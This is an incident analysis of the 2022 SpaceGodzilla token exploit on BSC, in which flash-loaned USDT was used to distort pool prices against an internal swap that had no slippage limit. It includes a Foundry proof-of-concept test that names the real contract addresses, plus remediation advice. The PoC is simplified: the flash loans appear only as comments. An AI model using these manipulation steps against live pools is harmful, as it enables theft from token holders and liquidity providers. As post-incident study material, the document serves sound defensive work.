# SpaceGodzilla — Liquidity Swap Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07-28 |
| **Protocol** | SpaceGodzilla Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~25,378 BUSD |
| **Attacker** | [0x00a62eb08868ec6feb23465f61aa963b89e57e57](https://bscscan.com/address/0x00a62eb08868ec6feb23465f61aa963b89e57e57) |
| **Attack Contract** | [0x3d817ea746edd02c088c4df47c0ece0bd28dcd72](https://bscscan.com/address/0x3d817ea746edd02c088c4df47c0ece0bd28dcd72) |
| **Vulnerable Contract (SpaceGodzilla)** | [0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0](https://bscscan.com/address/0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0) |
| **SpaceGodzilla/USDT LP** | [0x8AfF4e8d24F445Df313928839eC96c4A618a91C8](https://bscscan.com/address/0x8AfF4e8d24F445Df313928839eC96c4A618a91C8) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | `swapTokensForOther()` uses `amountOutMin=0`, accepting the AMM spot price as-is — allowing swaps to execute at any price when reserves are manipulated (no slippage protection) |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/SpaceGodzilla_exp.sol) |

---
## 1. Vulnerability Overview

The SpaceGodzilla token had an internal mechanism, `swapAndLiquifyStepv1()`, that automatically adds liquidity under certain conditions. The attacker borrowed approximately 2.95 million USDT from 16 flash loan pools and injected this large volume of USDT into the LP pool, drastically manipulating the SpaceGodzilla/USDT ratio. They then called `swapTokensForOther()` and `swapAndLiquifyStepv1()` to swap tokens at the distorted price and realize a profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable internal swap function — operates solely on the current pool price
function swapTokensForOther(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = USDT;

    // ❌ No slippage protection — uses manipulated price as-is
    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        0,           // ❌ amountOutMin = 0 → accepts any price
        path,
        address(this),
        block.timestamp
    );
}

// ✅ Correct pattern — TWAP oracle + slippage protection
function swapTokensForOther(uint256 tokenAmount) private {
    uint256 twapPrice = getTWAPPrice(); // Time-weighted average price
    uint256 minOut = tokenAmount * twapPrice * 95 / 100; // Allow 5% slippage
    // ...
    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tokenAmount,
        minOut, // ✅ Minimum output amount set
        path,
        address(this),
        block.timestamp
    );
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**SpaceGodzilla_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `swapTokensForOther()` uses `amountOutMin=0`, accepting the AMM spot price as-is — allowing swaps to execute at any price when reserves are manipulated (no slippage protection
    function swapTokensForOther(uint256 arg0) external view returns (uint256) {}  // 0x57eba63c  // ❌ Vulnerability
```

**Decompiled_0x2287C04a.sol** — Related contract:
```solidity
// ❌ Root cause: `swapTokensForOther()` uses `amountOutMin=0`, accepting the AMM spot price as-is — allowing swaps to execute at any price when reserves are manipulated (no slippage protection
    function swapTokensForOther(uint256 arg0) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Borrow ~2.95M USDT from 16 flash loan pools
    │
    ├─[2] Call swapTokensForOther()
    │       └─ Buy SpaceGodzilla tokens (begin pool price manipulation)
    │
    ├─[3] Transfer large amount of USDT directly to LP pool (excluding 100k)
    │       └─ Drastically distort SpaceGodzilla/USDT ratio
    │
    ├─[4] Execute first swap
    │       └─ Obtain ~73.7 trillion SpaceGodzilla at distorted price
    │
    ├─[5] Call swapAndLiquifyStepv1()
    │       └─ Trigger token's internal liquidity mechanism
    │
    ├─[6] Transfer accumulated SpaceGodzilla to LP pool
    │
    ├─[7] Second swap → realize net USDT profit
    │
    └─[8] Repay flash loans → 25,378 BUSD net profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ISpaceGodzilla {
    function swapTokensForOther(uint256 tokenAmount) external;
    function swapAndLiquifyStepv1() external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUni_Pair_V2 {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

contract SpaceGodzillaExploit is Test {
    ISpaceGodzilla sgToken = ISpaceGodzilla(0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0);
    IUni_Pair_V2 pair = IUni_Pair_V2(0x8AfF4e8d24F445Df313928839eC96c4A618a91C8);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 19_523_980);
    }

    function testExploit() public {
        // [Step 1] Obtain large amount of USDT via flash loans (chained across 16 pools)
        // Borrow approximately 2,950,000 USDT

        // [Step 2] Call swapTokensForOther to begin initial price manipulation
        sgToken.swapTokensForOther(1_000_000 * 1e18);

        // [Step 3] Transfer USDT directly to LP pool (distort pool ratio)
        USDT.transfer(address(pair), USDT.balanceOf(address(this)) - 100_000 * 1e18);

        // [Step 4] Swap large amount of SpaceGodzilla at distorted price
        (uint112 r0, , ) = pair.getReserves();
        pair.swap(r0 * 99 / 100, 0, address(this), "");

        // [Step 5] Trigger liquidity mechanism
        sgToken.swapAndLiquifyStepv1();

        // [Step 6] Transfer acquired SpaceGodzilla to LP pool, then reverse-swap
        IERC20(address(sgToken)).transfer(
            address(pair),
            IERC20(address(sgToken)).balanceOf(address(this))
        );
        pair.swap(0, USDT.balanceOf(address(pair)) * 99 / 100, address(this), "");

        emit log_named_decimal_uint("Net profit USDT", USDT.balanceOf(address(this)), 18);
        // ~25,378 BUSD net profit after flash loan repayment
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Reliance on AMM spot price oracle |
| **Attack Vector** | Flash loan + large-scale liquidity injection to manipulate AMM price |
| **Preconditions** | Internal swap without slippage protection, flash-loan-vulnerable AMM |
| **Impact** | 25,378 BUSD loss |

---
## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Use a time-weighted average price (TWAP) instead of the spot price to resist instantaneous price manipulation via flash loans.
2. **Enforce Slippage Protection**: Set `amountOutMin` to a reasonable non-zero value in internal swap functions.
3. **Review Automated Liquidity Mechanisms**: Automated liquidity mechanisms such as `swapAndLiquifyStepv1()` must be designed to be unaffected by external price manipulation.

---
## 7. Lessons Learned

- **Risks of Automated Liquidity Mechanisms**: When a token performs internal automatic swaps or liquidity provisioning, this mechanism can become a target for price manipulation attacks. Without slippage protection in particular, the contract will automatically execute unfavorable trades at manipulated prices.
- **Interaction Between Flash Loans and AMMs**: Large-scale flash loans can temporarily move AMM pool prices to extreme levels. To defend against attacks that exploit this, protocols should use TWAP as the price reference rather than single-block spot prices.